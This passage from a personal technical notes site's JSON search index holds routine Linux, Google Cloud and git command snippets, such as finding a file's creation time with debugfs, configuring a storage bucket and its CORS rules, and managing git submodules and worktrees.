href=\"/notes/docs/docker/dockerfile/nginx/docker-compose.yml\"\u003edocker-compose.yml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/nginx/nginx.conf\"\u003enginx.conf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rstudio\"\u003erstudio\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/rstudio/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/rstudio/pkg.txt\"\u003epkg.txt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"supervisord\"\u003esupervisord\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/supervisord/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/supervisord/supervisord.conf\"\u003esupervisord.conf\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003eservice with supervisord\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/supervisord/service_with_supervisord/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Docker docs"},{"categories":null,"contents":" File create time 1. Find Inode $ stat dns.yaml File: dns.yaml Size: 1003 Blocks: 8 IO Block: 4096 regular file Device: ca01h/51713d Inode: 3595636 Links: 1 Access: (0644/-rw-r--r--) Uid: ( 1000/ ubuntu) Gid: ( 1000/ ubuntu) Access: 2022-05-03 12:59:59.996755279 +0800 Modify: 2021-12-10 18:27:54.157585209 +0800 Change: 2022-01-07 14:57:58.619727878 +0800 Birth: - or\n$ ls -i dns.yaml 3585173 dns.yaml 2. Find Filesystem $ df dns.yaml Filesystem 1K-blocks Used Available Use% Mounted on /dev/root 101583780 25703988 75863408 26% / 3. Get Create Time $ sudo debugfs -R \u0026#39;stat \u0026lt;3595636\u0026gt;\u0026#39; /dev/root Inode: 3595636 Type: regular Mode: 0644 Flags: 0x80000 Generation: 449657737 Version: 0x00000000:00000001 User: 1000 Group: 1000 Project: 0 Size: 1003 File ACL: 0 Links: 1 Blockcount: 8 Fragment: Address: 0 Number: 0 Size: 0 ctime: 0x61d7e476:93c13018 -- Fri Jan 7 14:57:58 2022 atime: 0x6270b6cf:eda51d3c -- Tue May 3 12:59:59 2022 mtime: 0x61b32baa:25923ce4 -- Fri Dec 10 18:27:54 2021 crtime: 0x61b32baa:25923ce4 -- Fri Dec 10 18:27:54 2021 Size of extra inode fields: 32 Inode checksum: 0x5b176bb2 EXTENTS: (0):2665902 Display Ubuntu\u0026#39;s Message of the Day sudo chmod +x /etc/update-motd.d/* List domains sed \u0026#39;s/ //g\u0026#39; domains-info.md | awk -F \u0026#39;|\u0026#39; \u0026#39;{if($3 ~ /.*\\.com/)print $3}\u0026#39; | sort | uniq ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/file/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eFile create time\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch4 id=\"1-find-inode\"\u003e1. Find Inode\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ stat dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File: dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Size: \u003cspan style=\"color:#ae81ff\"\u003e1003\u003c/span\u003e        Blocks: \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e          IO Block: \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e   regular file\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice: ca01h/51713d    Inode: \u003cspan style=\"color:#ae81ff\"\u003e3595636\u003c/span\u003e     Links: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccess: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0644/-rw-r--r--\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e  Uid: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e 1000/  ubuntu\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e   Gid: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e 1000/  ubuntu\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccess: 2022-05-03 12:59:59.996755279 +0800\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eModify: 2021-12-10 18:27:54.157585209 +0800\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eChange: 2022-01-07 14:57:58.619727878 +0800\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e Birth: -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eor\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls -i dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e3585173\u003c/span\u003e dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"2-find-filesystem\"\u003e2. Find Filesystem\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ df dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFilesystem     1K-blocks     Used Available Use% Mounted on\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/dev/root      \u003cspan style=\"color:#ae81ff\"\u003e101583780\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e25703988\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e75863408\u003c/span\u003e  26% /\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"3-get-create-time\"\u003e3. Get Create Time\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo debugfs -R \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;stat \u0026lt;3595636\u0026gt;\u0026#39;\u003c/span\u003e /dev/root\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInode: \u003cspan style=\"color:#ae81ff\"\u003e3595636\u003c/span\u003e   Type: regular    Mode:  \u003cspan style=\"color:#ae81ff\"\u003e0644\u003c/span\u003e   Flags: 0x80000\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGeneration: \u003cspan style=\"color:#ae81ff\"\u003e449657737\u003c/span\u003e    Version: 0x00000000:00000001\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser:  \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e   Group:  \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e   Project:     \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e   Size: \u003cspan style=\"color:#ae81ff\"\u003e1003\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFile ACL: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLinks: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e   Blockcount: \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFragment:  Address: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e    Number: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e    Size: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e ctime: 0x61d7e476:93c13018 -- Fri Jan  \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e 14:57:58 \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e atime: 0x6270b6cf:eda51d3c -- Tue May  \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e 12:59:59 \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e mtime: 0x61b32baa:25923ce4 -- Fri Dec \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e 18:27:54 \u003cspan style=\"color:#ae81ff\"\u003e2021\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecrtime: 0x61b32baa:25923ce4 -- Fri Dec \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e 18:27:54 \u003cspan style=\"color:#ae81ff\"\u003e2021\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSize of extra inode fields: \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInode checksum: 0x5b176bb2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEXTENTS:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e:2665902\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDisplay Ubuntu\u0026#39;s Message of the Day\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chmod +x /etc/update-motd.d/*\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eList domains\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esed \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s/ //g\u0026#39;\u003c/span\u003e domains-info.md | awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;|\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{if($3 ~ /.*\\.com/)print $3}\u0026#39;\u003c/span\u003e | sort | uniq\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"File Related Command"},{"categories":null,"contents":" monitoring # list gcloud alpha monitoring policies list --project=\u0026#34;project-prod-a\u0026#34; \u0026gt;project-prod-a.yaml # update gcloud alpha monitoring policies update --policy-from-file=\u0026#34;project-prod-a.yaml\u0026#34; \u0026#34;project-prod-a\u0026#34; cloud storage # Create bucket gsutil mb -c standard -l asia-east2 gs://prod-a gsutil iam ch allUsers:objectViewer gs://prod-a # Upload files gsutil -m rsync -x \u0026#34;.svn/\u0026#34; -u -d -r srcDir gs://prod-a gsutil -m cp downloads/*.csv gs://prod-a/data/ # Create CORS file cat \u0026lt;\u0026lt; EOF \u0026gt; /data/cors.json [ { \u0026#34;origin\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;responseHeader\u0026#34;: [\u0026#34;Access-Control-Allow-Origin\u0026#34;], \u0026#34;method\u0026#34;: [\u0026#34;GET\u0026#34;,\u0026#34;HEAD\u0026#34;,\u0026#34;DELETE\u0026#34;], \u0026#34;maxAgeSeconds\u0026#34;: 3600 } ] EOF # Set CORS gsutil cors set /data/cors.json gs://prod-a/ # Check CORS gsutil cors get gs://prod-a/ # Purge CDN gcloud compute url-maps invalidate-cdn-cache balancer-client-prod-a --host ${} --path \u0026#34;/*\u0026#34; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/gcp/command/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emonitoring\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egcloud alpha monitoring policies list --project\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;project-prod-a\u0026#34;\u003c/span\u003e \u0026gt;project-prod-a.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# update\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egcloud alpha monitoring policies update --policy-from-file\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;project-prod-a.yaml\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;project-prod-a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecloud storage\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Create bucket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil mb -c standard -l asia-east2 gs://prod-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil iam ch allUsers:objectViewer gs://prod-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Upload files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil -m rsync -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.svn/\u0026#34;\u003c/span\u003e -u -d -r srcDir  gs://prod-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil -m cp downloads/*.csv gs://prod-a/data/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Create CORS file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt; EOF \u0026gt; /data/cors.json\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;origin\u0026#34;: [\u0026#34;*\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;responseHeader\u0026#34;: [\u0026#34;Access-Control-Allow-Origin\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;method\u0026#34;: [\u0026#34;GET\u0026#34;,\u0026#34;HEAD\u0026#34;,\u0026#34;DELETE\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;maxAgeSeconds\u0026#34;: 3600\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set CORS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil cors set /data/cors.json gs://prod-a/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Check CORS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil cors get gs://prod-a/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Purge CDN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egcloud compute url-maps invalidate-cdn-cache balancer-client-prod-a --host \u003cspan style=\"color:#e6db74\"\u003e${}\u003c/span\u003e --path \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"GCP Command"},{"categories":null,"contents":" Search in git git rev-list --all | xargs git grep -F \u0026#39;\u0026#39; Count commits git rev-list --count main View a file of another branch git show dev:main.go Take a backup of untracked files git ls-files --others --exclude-standard -z | xargs -0 tar rvf backup-untracked.zip Submodule # Add submodule git submodule add -b main git@github.com:linzeyan/toha.git themes/toha # Update submodule git submodule update --init --remote # Remove submodule modulePath=\u0026#34;themes/toha\u0026#34; git submodule deinit -f ${modulePath} git rm ${modulePath} rm -rf .git/modules/${modulePath} git config --remove-section submodule.${modulePath}. rm -f .gitmodules commit hash git rev-parse HEAD commit tag git describe --tags worktree # list git worktree list # add git worktree add ../dirname branch-name git config [user] email = zeyanlin@outlook.com name = Ricky signingkey = 2A4313489FDCA802ED6FCC214B03D879EA73DF37 [commit] gpgsign = true git config1 For golang import package\n[url \u0026#34;git@gitlab.example.com:\u0026#34;] insteadOf = https://gitlab.example.com/ git config2 [includeIf \u0026#34;gitdir:~/work/\u0026#34;] path = ~/.gitconfig-work remove big file in repository uv venv source .venv/bin/activate uv pip install git-filter-repo git filter-repo --force --strip-blobs-bigger-than 100M ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/git/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSearch in git\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rev-list --all | xargs git grep -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCount commits\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rev-list --count main\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eView a file of another branch\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit show dev:main.go\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTake a backup of untracked files\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit ls-files --others --exclude-standard -z | xargs -0 tar rvf backup-untracked.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSubmodule\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Add submodule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add -b main git@github.com:linzeyan/toha.git themes/toha\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Update submodule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule update --init --remote\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan 